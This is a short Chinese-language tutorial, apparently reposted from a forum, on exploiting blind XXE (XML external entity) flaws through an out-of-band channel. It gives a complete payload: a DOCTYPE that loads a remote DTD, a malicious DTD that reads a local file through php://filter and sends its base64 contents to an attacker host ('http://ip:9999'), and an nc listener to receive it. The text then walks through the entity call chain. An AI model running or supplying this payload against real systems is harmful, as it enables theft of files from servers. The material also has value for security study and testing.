# XXE 无回显利用方式总结

> 原文：[https://www.zhihuifly.com/t/topic/3588](https://www.zhihuifly.com/t/topic/3588)

## XXE 无回显利用方式总结

可以使用外带数据通道提取数据，先用file://或php://filter获取目标文件的内容，然后将内容以http请求发送到接收数据的服务器（攻击服务器）

```
<!DOCTYPE convert [ 
<!ENTITY % remote SYSTEM "http://ip/test.dtd">
%remote;%int;%send;
]> 
```

##### evil.dtd的内容，内部的`%`号要进行实体编码成`%`

> 这里已经改好了

```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///D:/test.txt">
<!ENTITY % int "<!ENTITY &#37 send SYSTEM 'http://ip:9999?p=%file;'>"> 
```

最后用nc进行本地监听

```
nc -lvv 9999 
```

**整个调用过程：**

我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 `&#37;`)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。